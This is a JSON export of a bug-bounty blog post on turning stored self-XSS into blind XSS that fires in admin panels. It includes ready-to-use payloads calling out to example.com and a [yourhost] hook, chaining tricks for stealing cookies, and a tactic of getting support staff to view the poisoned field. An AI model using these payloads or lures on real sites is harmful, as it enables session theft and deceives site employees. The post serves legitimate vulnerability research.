{"id":101,"date":"2017-11-14T16:43:58","date_gmt":"2017-11-14T16:43:58","guid":{"rendered":"https:\/\/xpoc.pro\/?p=101"},"modified":"2019-07-11T04:05:55","modified_gmt":"2019-07-11T01:05:55","slug":"turning-stored-self-xss","status":"publish","type":"post","link":"https:\/\/xp.ht\/turning-stored-self-xss\/","title":{"rendered":"One more way to exploit a Stored Self-XSS"},"content":{"rendered":"<blockquote><p>Self-XSS is better than no XSS.\u00a0<em>\u00a9Captain Obvious.<\/em><\/p><\/blockquote>\n<p style=\"text-align: justify;\">Hello. In this blog post, I will describe one more way to exploit the Self-XSS. Usually, this type of XSS is underestimated because of self-exploitation only.<br \/>\nHowever, there are a lot of ways to convert it to the good XSS. Things which can be useful in chains:<!--more--><\/p>\n<ul>\n<li style=\"text-align: left;\">login csrf to attacker&#8217;s account with XSS payload (we can have similar to the unauthenticated, but good XSS at once &#8211; it acts on behalf of attacker&#8217;s account, but still can be useful in deface scenarios);<\/li>\n<li style=\"text-align: left;\">lack of X-Frame-Options header (Clickjacking-related &#8211; for example, force the victim to store Self-XSS);<\/li>\n<li style=\"text-align: left;\">X-Frame-Options: Sameorigin + login\/logout CSRF (awesome examples <a href=\"https:\/\/whitton.io\/articles\/uber-turning-self-xss-into-good-xss\/\" target=\"_blank\" rel=\"noopener noreferrer\">here<\/a> and <a href=\"https:\/\/www.geekboy.ninja\/blog\/airbnb-bug-bounty-turning-self-xss-into-good-xss-2\/\" target=\"_blank\" rel=\"noopener noreferrer\">here<\/a>);<\/li>\n<li>window.opener + login CSRF (works in the browsers which support opener reference, requires an\u00a0external link on sameorigin to the Stored XSS exploit &#8211; attacker posts external link [must be opened in the new window] to the POC somewhere on the vulnerable site, when victim clicks it, POC performs login CSRF to the attacker&#8217;s account in the new window, opens page with payload, since both tabs have same origin, XSS payload, despite stored in the attacker&#8217;s account, can get access to the victim&#8217;s cookies from previous tab through window.opener, and steal them);<\/li>\n<li style=\"text-align: left;\">clipboard bugs (when XSS is executed upon pasting of some text);<\/li>\n<li style=\"text-align: left;\">etc&#8230;<\/li>\n<\/ul>\n<p style=\"text-align: justify;\">But what if we have no such ways to exploit Self-XSS? No login\/logout CSRF, X-Frame-Options: Deny set, for example?<br \/>\nThis post will describe another approach for the exploitation of Stored Self-XSS. I used it to exploit Stored Self-XSS in such programs as PornHub, DOD, AirBnB<\/p>\n<p>The idea is next:<br \/>\nIf we have Stored Self-XSS (for example, in the profile field), then:<\/p>\n<ul>\n<li>There is no output sanitization, obviously.<\/li>\n<li>With a high probability, there is also no data sanitization in the\u00a0database field (e.g. data returned as-is).<\/li>\n<\/ul>\n<p style=\"text-align: justify;\">Now we should think, what if this input also visible in the other places, like admin panel? If it&#8217;s exploitable here, it could be exploitable there as well (and in most cases for me it was).<br \/>\nFor sure we can put some Blind XSS payload in the profile field, and wait for a pingback. Here comes the next problem &#8211; the payload may not work. Not because it&#8217;s unexploitable, but because no one on the admin side will visit it, especially if the site has a\u00a0big count of users. Report without POC isn&#8217;t a good report, huh?<\/p>\n<blockquote><p>PornHub &#8211; <a href=\"https:\/\/hackerone.com\/reports\/216379\" target=\"_blank\" rel=\"noopener noreferrer\">Self XSS to the Blind Stored XSS<\/a><\/p><\/blockquote>\n<p style=\"text-align: justify;\">It was a good example of such approach. There was no login CSRF, and safe X-Frame-Options header.<br \/>\nI discovered a Stored Self-XSS in the <code>http:\/\/www.pornhub.com\/model\/settings<\/code> page (address section), in the input fields:<br \/>\n<img loading=\"lazy\" decoding=\"async\" class=\"aligncenter wp-image-110 size-full\" src=\"https:\/\/xpoc.pro\/wp-content\/uploads\/2017\/11\/ph.jpg\" alt=\"\" width=\"911\" height=\"538\" srcset=\"https:\/\/xp.ht\/wp-content\/uploads\/2017\/11\/ph.jpg 911w, https:\/\/xp.ht\/wp-content\/uploads\/2017\/11\/ph-300x177.jpg 300w, https:\/\/xp.ht\/wp-content\/uploads\/2017\/11\/ph-768x454.jpg 768w\" sizes=\"(max-width: 911px) 100vw, 911px\" \/><\/p>\n<p>I tried some common blind XSS payloads. Now I am using something like<\/p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">'\"&gt;&lt;svg onload=fetch('\/\/example.com\/hook?parameters=')&gt;<\/pre>\n<p style=\"text-align: justify;\">with different variations to test Blind XSSes, where <strong>example.com<\/strong> &#8211; my host, and <strong>hook<\/strong> &#8211; my hook for catching incoming requests, but that time I used XMLHttpRequest, so payload was:<\/p>\n<pre class=\"brush:js\">\"autofocus\/onfocus=\"thr=new XMLHttpRequest();\nthr.open('GET','\/\/[yourhost]\/[yourhook].php?t=&amp;d='+document.domain,true);\nthr.send(null);\"\/\/<\/pre>\n<p style=\"text-align: justify;\">It worked for me &#8211; I got a\u00a0request to the hook when I visited the settings page. However, there were no other requests except mine for a couple of time. I created the\u00a0new account\u00a0and made one more application with payload &#8211; no results. And I did the next thing (which can be considered as social engineering under some circumstances, so be careful, and use it only if you are 99% sure that there is Blind XSS in place) &#8211; I contacted with MPP support, and asked to change some information in the settings, which couldn&#8217;t be changed from my side. Guess what? After 20 minutes I got a request to my hook from the some PH employee. So I had now the POC that BXSS works. After this, I quickly submitted the report and got the bounty.<\/p>\n<p style=\"text-align: justify;\">I used the same method with some DOD resources when I was sure that Stored Self-XSS could be exploitable on the admin side. It resulted in the two successful authentication bypasses with access to the admin panels. But before using this approach, please, read the program policy carefully.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>Self-XSS is better than no XSS.\u00a0\u00a9Captain Obvious. Hello. In this blog post, I will describe one more way to exploit the Self-XSS. Usually, this type of XSS is underestimated because of self-exploitation only. However, there are a lot of ways to convert it to the good XSS. Things which can be useful in chains:<\/p>\n","protected":false},"author":1,"featured_media":0,"comment_status":"closed","ping_status":"closed","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[2],"tags":[],"_links":{"self":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts\/101"}],"collection":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/comments?post=101"}],"version-history":[{"count":5,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts\/101\/revisions"}],"predecessor-version":[{"id":482,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/posts\/101\/revisions\/482"}],"wp:attachment":[{"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/media?parent=101"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/categories?post=101"},{"taxonomy":"post_tag","embeddable":true,"href":"https:\/\/xp.ht\/wp-json\/wp\/v2\/tags?post=101"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}